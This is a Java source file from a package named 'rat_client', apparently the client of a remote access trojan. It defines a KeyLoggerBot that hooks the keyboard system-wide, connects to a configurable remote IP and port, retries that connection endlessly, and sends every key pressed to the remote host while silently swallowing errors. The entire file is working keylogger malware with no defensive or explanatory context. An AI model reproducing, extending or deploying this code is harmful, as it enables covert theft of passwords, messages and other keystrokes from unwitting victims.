package rat_client;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLoggerBot implements Runnable
{
    private Socket socket;
    private String ip;
    private int port;
    private Thread thread;
    private KeyLogger keyLogger;
    
    public KeyLoggerBot(String ip,int port)
    {
        this.ip=ip;
        this.port=port;
        thread=new Thread(this);
        thread.start();
    }
    
    private void createKeyLoggerStream()
    {
        try
        {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException exc)
        {
            
        }
        try
        {
             ObjectOutputStream oos=new ObjectOutputStream(socket.getOutputStream());
             new Thread(new Runnable() {

                 @Override
                 public void run() {
                     try
                     {
                         ObjectInputStream ois=new ObjectInputStream(socket.getInputStream());
                         ois.readUTF();
                     }
                     catch(IOException e)
                     {
                         
                     }
                     GlobalScreen.getInstance().removeNativeKeyListener(keyLogger);
                     thread=new Thread(KeyLoggerBot.this);
                     thread.start();
                 }
             }).start();
             keyLogger=new KeyLogger(oos);
             GlobalScreen.getInstance().addNativeKeyListener(keyLogger);
        }
        catch(IOException exc)
        {
            thread=new Thread(KeyLoggerBot.this);
            thread.start();
        }
    }
    
    @Override
    public void run()
    {
        while(true)
          try
          {
              socket=new Socket(ip,port);
              createKeyLoggerStream();
              return;
          }
          catch(IOException exc)
          {
            
          }
    }
    
    private class KeyLogger implements NativeKeyListener
    {
        private ObjectOutputStream oos;
        
        public KeyLogger(ObjectOutputStream oos)
        {
            this.oos=oos;
        }
        
        @Override
        public void nativeKeyPressed(NativeKeyEvent nke)   //JNI, implement linux lib too.
        {
              if(socket.isClosed())
              {
                  GlobalScreen.getInstance().removeNativeKeyListener(keyLogger);
                  thread=new Thread(KeyLoggerBot.this);
                  thread.start();
                  return;
              }
              try
              {
                  oos.writeObject(new String[]{Character.toString((char)nke.getRawCode()),nke.getKeyText(nke.getKeyCode())});
                  oos.flush();
              }
              catch(IOException exc)
              {
                  GlobalScreen.getInstance().removeNativeKeyListener(keyLogger);
                  thread=new Thread(KeyLoggerBot.this);
                  thread.start();
                  return;
              }
        }

        @Override
        public void nativeKeyReleased(NativeKeyEvent nke) {
            
        }

        @Override
        public void nativeKeyTyped(NativeKeyEvent nke) {
            
        }   
    }
}
